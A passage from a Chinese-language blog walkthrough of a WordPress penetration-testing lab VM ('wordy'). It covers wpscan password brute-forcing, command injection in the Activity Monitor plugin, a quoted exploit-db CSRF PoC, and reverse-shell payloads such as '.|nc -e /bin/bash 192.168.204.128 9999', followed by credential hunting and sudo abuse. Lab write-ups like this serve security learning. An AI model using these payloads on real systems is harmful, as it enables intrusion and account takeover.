<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481920404.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>虽然其中获得了很多链接，但我们仔细观察，不难发现，IP地址的下级目录分布均在以下三个文件目录之中：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-content/">http://192.168.204.135/wp-content/</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-includes/">http://192.168.204.135/wp-includes/</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-admin/">http://192.168.204.135/wp-admin/</a></p>
</blockquote>
<h3 id="爆破结果"><a href="#爆破结果" class="headerlink" title="爆破结果"></a>爆破结果</h3><p>综合三种爆破方式得到的目录列表，得到目录列表：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-content/">http://192.168.204.135/wp-content/</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-includes/">http://192.168.204.135/wp-includes/</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-admin/">http://192.168.204.135/wp-admin/</a></p>
<p><a target="_blank" rel="noopener" href="http://wordy/wp-login.php?redirect_to=http://192.168.204.135/wp-admin/&reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.204.135%2Fwp-admin%2F&amp;reauth=1</a></p>
<p><a target="_blank" rel="noopener" href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/index.php">http://192.168.204.135/index.php</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/license.txt">http://192.168.204.135/license.txt</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/readme.html">http://192.168.204.135/readme.html</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-admin/install.php">http://192.168.204.135/wp-admin/install.php</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-config.php">http://192.168.204.135/wp-config.php</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-login.php">http://192.168.204.135/wp-login.php</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-cron.php">http://192.168.204.135/wp-cron.php</a></p>
</blockquote>
<p>尝试逐个登陆，其中有一些网页的响应内容是空的，有些不是。如下面的登陆界面。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626449346.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="用户账户爆破"><a href="#用户账户爆破" class="headerlink" title="用户账户爆破"></a>用户账户爆破</h2><p>上面由nmap漏扫得到的可显示的用户名列表为：</p>
<blockquote>
<p>admin</p>
<p>graham</p>
<p>mark</p>
<p>sarah</p>
<p>jens</p>
</blockquote>
<p>因为nmap漏扫的得到的提示信息显示，这些用户名并不完全是所有用户，由于权限限制，所以只显现了这么多。</p>
<p>已知目标靶机使用的是CMS框架WordPress，针对WordPress，有一款对应的黑盒子扫描工具<code>wpscan</code>，可用于爆破用户名以及用户密码。</p>
<p>尝试使用wpscan爆破用户名，看看是否能够在已有用户名的基础上再多获得几个用户名。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://wordy/ -e u<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721616222974.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>好吧，爆破出来的结果并没有获得其它更多的用户名。因此可以先将目前已经拥有的用户名写入一个用户名字典中。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721616704302.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>用户名字典有了，还需要有个密码字典就可以尝试用户爆破了。</p>
<p>回顾之前做的有关wordpress框架的密码字典获取，它是根据已有的flag提示使用cewl进行密码字典生成的。</p>
<p>我们也尝试一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cewl http://wordy/ -w CewlDictDC5v1.txt<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721616973120.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ok！，尝试使用现在拥有的用户名和密码字典进行用户爆破。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://wordy/ -U usersDC5.txt -P CewlDictDC5v1.txt<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721617167389.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>根据提示，所用的密码字典中的例子都无法成功爆破。所以cewl生成的密码字典无效。需要重新寻找爆破字典。</p>
<p>惹，不推荐使用kali自带的那个爆破字典<code> /usr/share/wordlists/rockyou.txt</code>爆破速度慢得要命。（估计是因为字典太大了？）</p>
<p>去下载官网vulnhub看看有没有什么提示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721624077372.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ok！开发者们真善良，我们只是想找一份工作而已哈哈哈哈哈。以下是他给我们得操作提示。</p>
<blockquote>
<p>cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt</p>
<p>这段指令的意思是，获取kali默认密码字典的内容并筛选其中包含字符串“k01”的密码，将筛选的结果输出保存到文件passwords.txt中</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwordsdc5.txt<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721624369380.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>操作成功，接下来就是要执行用户账户爆破了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://wordy/ -U usersDC5.txt -P passwordsdc5.txt<br></code></pre></td></tr></table></figure>

<p>ok！成功爆破出一个用户账户。</p>
<blockquote>
<p> Username: mark</p>
<p> Password: helpdesk01</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721624638803.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="用户登陆-信息获取"><a href="#用户登陆-信息获取" class="headerlink" title="用户登陆&amp;信息获取"></a>用户登陆&amp;信息获取</h2><p>之前我们在进行目录爆破的时候，逐一访问爆破出来的网页的时候，有如下登陆界面，尝试使用上面爆破得到的账户进行登陆。（注意，需要到kali里面操作哦！因为重定向纠正是在kali里面的）</p>
<p><a target="_blank" rel="noopener" href="http://192.168.204.135/wp-login.php">http://192.168.204.135/wp-login.php</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626484402.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ok，前面虽然有cookie报错，但是尝试了两边之后，就登陆成功了。而且惊喜的是，登陆成功的是admin管理员后台系统。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626563699.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>在模块<code>Users</code>获取了员工信息：用户名、姓名、邮箱、工作角色。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626854866.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>还发现了一个<code>Activity monitor</code>模块，活动管理模块（活动监视器），功能类似于日志，监控系统资源的使用：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721627244039.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>在<code>wordpress</code>框架中，使用到<code>Activity monitor</code>工具可以理解为“插件”。关于该插件的漏洞利用，是存在的哦！</p>
<h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>使用<code>searchsploit</code>查找可利用的代码文件。（需要将wordpress和Activity monitor这两个关键词都包含哦！）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit WordPress Activity monitor<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721627774276.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>得到了两条查询结果：</p>
<blockquote>
<p>php&#x2F;webapps&#x2F;45274.html</p>
<p>php&#x2F;webapps&#x2F;50110.py</p>
</blockquote>
<p>可以先下载保存一下，看看是什么内容的文件，又或者先使用<code>-P</code>选项查看其详细信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 45274.html<br>searchsploit -p 50110.py<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721628066665.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ul>
<li><strong>先cat查看45274.html文件</strong></li>
</ul>
<h3 id="POC反弹shell（傻呗）"><a href="#POC反弹shell（傻呗）" class="headerlink" title="POC反弹shell（傻呗）"></a>POC反弹shell（傻呗）</h3><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721629740248.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>给出了POC执行代码和提示：</p>
<blockquote>
<p>Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</p>
<p>PoC：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;html&gt;<br>&lt;body&gt;<br>&lt;script&gt;history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)&lt;/script&gt;<br> &lt;form action=<span class="hljs-string">&quot;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>   &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;ip&quot;</span> value=<span class="hljs-string">&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&quot;</span> /&gt;<br>   &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;lookup&quot;</span> value=<span class="hljs-string">&quot;Lookup&quot;</span> /&gt;<br>   &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;<br> &lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
</blockquote>
<p>仔细查看POC的内容，发现其来源“action”是”<a target="_blank" rel="noopener" href="http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools%22%E8%BF%99%E4%B8%AA%E7%BD%91%E9%A1%B5%E3%80%82%E5%BE%88%E7%86%9F%E6%82%89%EF%BC%81%E8%B7%9F%E5%A6%82%E4%B8%8B%60Activity">http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot;这个网页。很熟悉！跟如下`Activity</a> monitor<code>网页的链接后半部分都一样，而且这里的</code>localhost:8000&#96;应该也是指本地主机和监听端口了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721632560322.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>抓包，抓取Referer与上述action值对应的数据包。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633174618.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>先发送至重放器，然后右键点击如下：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240722161127082.png" srcset="/img/loading.gif" lazyload alt="image-20240722161127082"></p>
<p>将其中的poc内容替换为文件内容。执行“用浏览器测试”。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633497290.png" srcset="/img/loading.gif" lazyload></p>
<p><a target="_blank" rel="noopener" href="http://burpsuite/show/6/rx0vjlu75w9ngnsxmajrpopwwkbt0wij">http://burpsuite/show/6/rx0vjlu75w9ngnsxmajrpopwwkbt0wij</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633567708.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>提交请求”Submit request”，即提交表单。并在这过程中进行抓包。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633609315.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633630059.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633654428.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>很遗憾，最后好像只是将反弹shell的命令注入到如上的输入框中，后台并没有实际执行这个命令。因为还是没有成功反弹。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633768955.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>按道理来说，提交表单之后应该就可以监听到反弹shell了，至于这里为什么失败了，看看是否是反弹时长比较长？之后再进行尝试吧。</p>
<ul>
<li><strong>查看50110.py文件</strong></li>
</ul>
<h3 id="漏洞脚本（-py）Getshell"><a href="#漏洞脚本（-py）Getshell" class="headerlink" title="漏洞脚本（.py）Getshell"></a>漏洞脚本（.py）Getshell</h3><p>这应该是个脚本文件，先看看它的具体代码内容吧。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721636490651.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>直接就有使用方法了！直接使用python3命令执行漏洞利用脚本。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 /usr/share/exploitdb/exploits/php/webapps/50110.py<br></code></pre></td></tr></table></figure>

<p>输入目标靶机的IP地址、已获得用户名、用户密码。</p>
<p> 码垛！直接成功了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721637189750.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>接下来，可以先查找一下有没有flag文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721637413521.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>查出来的结果挺少。也没有我们要找的flag文本文件。</p>
<p>所以，我们只好考虑提权了！</p>
<p>有关于Getshell的方法，还有一个利用网页组件漏洞的！</p>
<h3 id="网页组件漏洞Getshell"><a href="#网页组件漏洞Getshell" class="headerlink" title="网页组件漏洞Getshell"></a>网页组件漏洞Getshell</h3><p>首先，我们在进行网页检索的时候，在<code>Activity monitor</code>发现了一个可能的注入点<code>IP or integer *</code>。然后下方还有两个按钮控件，看着像是提交<code>IP or integer *</code>的按钮。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721637749847.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>根据提示信息：</p>
<p><code>Convert</code>按钮将会把IP地址或整型数据转化成与之等价的整型数据或IP地址。</p>
<p><code>Lookup</code>按钮会尝试去解决将一个IP地址转换为主机名字的问题。后面还说，如果dig在web服务器上安装了，那也可以被用作<code>搜索</code></p>
<p>然后我们可以尝试抓包，看看是什么效果：</p>
<ul>
<li><code>Convert</code>按钮</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721639725380.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ul>
<li><code>Lookup</code>按钮</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721639777147.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>两个按钮控件抓取的数据包好像没什么差别。也可能是因为输入的测试数据简单且不是命令。</p>
<p>从上面提示入手，<code>Lookup</code>按钮提示有：如果dig在web服务器上安装了，那也可以被用作<code>搜索</code>。那么我们就尝试输入与搜索相关的指令。</p>
<p>执行<code>ls</code>命令，抓包：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640027157.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>好像也没啥特别的。数据包内没有出现目录列表，网站中也没有出现目录列表。</p>
<p>输入域名，好像也没啥特别之处：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640165117.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>尝试使用并列执行命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">baidu.com|<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>

<p>完全放行完请求数据包后，发现在目标网站上出现了响应数据：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640264134.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>可以发现的是，这里执行了并行符号后面的<code>ls</code>指令。难道是需要有<code>|</code>符号在目标指令的前面才行？</p>
<p>尝试<code>|ls</code>，发现这样又不行了。</p>
<p>猜测不仅需要有<code>|</code>，还需要更多。</p>
<p>尝试<code>.com|ls</code>，发现这样又成功了！</p>
<p>尝试<code>.|ls</code> ，发现成功了！</p>
<p>这样以来，想要执行指令的最简便方式就是<code>.| + 目标指令</code></p>
<p>那就直接执行反弹shell的指令呗！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash 192.168.204.128 9999<br>.|nc -e /bin/bash 192.168.204.128 9999<br></code></pre></td></tr></table></figure>

<p>发现有前端输入长度限制：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640859469.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>那我们就尝试修改数据包吧！修改完成后重放！</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640983822.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641019990.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ok！成功获得反弹shell。</p>
<p>切换交互界面：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641094356.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="命令提权"><a href="#命令提权" class="headerlink" title="命令提权"></a>命令提权</h3><p>首先查看具有SUID权限的命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641213920.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>其中可以进行提权的有：<code>passwd</code>、<code>su</code>、<code>mount</code>、<code>umount</code>。但按照以往的经验，这些指令一般都无法成功提权。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641376061.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>也没有获得什么有用的提示。</p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>无法根据已有命令进行提权后，我们就需要去重新搜集一些有用的信息了。</p>
<p>使用<code>ls</code>命令查看目录列表：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641640491.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>这也太多了吧。。。。而且它们大多都是php代码文件。</p>
<p>尝试切换用户，之前我们在浏览网站的时候收到了团队核心人物介绍，说 jens 是他们开发团队的重要人物，那我们就先切换到 jens用户吧。</p>
<p>使用<code>su</code>命令，但是！需要有对应用户的密码呀！</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647126070.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>所以还是得从mark账户下的文件查找有关信息。</p>
<p>mark目录下还是有几个文件的：</p>
<blockquote>
<p>js 、maint 、css、images、network、user、includes </p>
</blockquote>
<p>只能逐一进行访问咯。其中：<br>· js 文件主要包含用于前端开发的 js 代码文件。js文件夹里面也全都是 js 代码文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647469829.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>· maint 文件夹下只包含了一个修复php文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647491273.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>· css文件夹下主要包含的是构成网页外观和样式的代码文件。其下也基本都是css代码文件，虽然有一个”colors“文件夹，但是看名字就知道应该跟我们想要的信息无关。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647651932.png" srcset="/img/loading.gif" lazyload></p>
<p>· images文件夹同css理，其下全都是图像文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647783119.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>· network文件夹，其下也全都是些php代码文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647828646.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>· user文件夹，听名字感觉可能会找到有用信息，查看其目录列表。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647924638.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<blockquote>
<p>about.php  credits.php   index.php  privacy.php  user-edit.php<br>admin.php  freedoms.php  menu.php   profile.php</p>
</blockquote>
<p>逐一访问了上述php文件，均没找到有用的可以利用的信息。</p>
<p>· includes 文件夹，看了一下，也全都是php文件，浅判断为没啥有用的信息。</p>
<p>如上，可以得知，在mark用户的<code>/var/www/html/wp-admin</code>目录下，没有什么有价值的信息。返回根目录进行查看。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648522524.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>发现其中有<code>home</code>目录，home目录通常为用户主目录，也许会记录有用户的相关信息，比如密码之类的。</p>
<p>进去看！！！！！！！！</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648640692.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>果然，分别对应有四个用户的用户文件。</p>
<p>分别进去查看呗。</p>
<ul>
<li>graham</li>
</ul>
<p>什么都没有。</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648731950.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ul>
<li>jens</li>
</ul>
<p>只有一个不知道用于备份什么的备份脚本文件<code>backups.sh</code>（backup：程序或文件的备份，拷贝）</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648770504.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>查看该脚本文件的内容：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648879649.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>好，没啥有用的信息。</p>
<ul>
<li>mark</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649004211.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>好了，终于可以触发连招了，”stuff：某个物质、材料、一组物品“，其下还有一个<code>things-to-do.txt</code>文件，看着像是待办。</p>
<p>cat一下呗：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649141874.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>有一个添加新用户,而且已经完成，在其中发现了<code>graham</code>的账户。</p>
<blockquote>
<p>user：graham</p>
<p>password：GSo7isUM1D4</p>
</blockquote>
<ul>
<li>sarah</li>
</ul>
<p>什么有没有呀</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649261175.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h3 id="切换graham用户"><a href="#切换graham用户" class="headerlink" title="切换graham用户"></a>切换graham用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su graham<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649353583.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>可以发现其下也分别拥有四个用户的文件。</p>
<p>tomato，继续搜集信息！</p>
<p>· 还是继续先查看各个用户下的文件吧：</p>
<blockquote>
<p>graham : 空，什么文件都没有。（<code>~</code>表示当前账户用户的意思）</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651383415.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<blockquote>
<p>jens ：同样只有那个<code>backups.sh</code>备份脚本</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651471925.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<blockquote>
<p>mark：和之前在mark用户所拥有的信息一致</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651540788.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<blockquote>
<p>sarah：空，什么文件都没有</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651582411.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>· 查看 sudo 配置信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649480690.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>有关于jens的提示：jens是无密码用户（NOPASSWD），这意味着我们无法切换到他，这个文件就是在mark的home目录下的jens文件下的备份脚本。</p>
<blockquote>
<p> (jens) NOPASSWD: &#x2F;home&#x2F;jens&#x2F;backups.sh</p>
</blockquote>
<p>不过这里既然都提示了这个脚本，那就执行看看吧。</p>
<p>进入到对应目录下执行<code>./backups.sh</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651683654.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>可以看到，由于权限不足，请求被拒绝了。</p>
<p>我们是在graham的账户上尝试去执行jens的脚本文件，好像权限不足也能理解。</p>
<p>所以我们需要使用sudo命令通过 jens 用户的身份去执行这个脚本文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -u jens ./backups.sh<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651934366.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>命令执行后下面显示的这段提示告诉我们：</p>
<blockquote>
<p><code>tar</code>在解压缩过程中自动处理了文件名，移除了开头的<code>/</code>，以保证解压缩到当前目录下的正确路径。</p>
</blockquote>
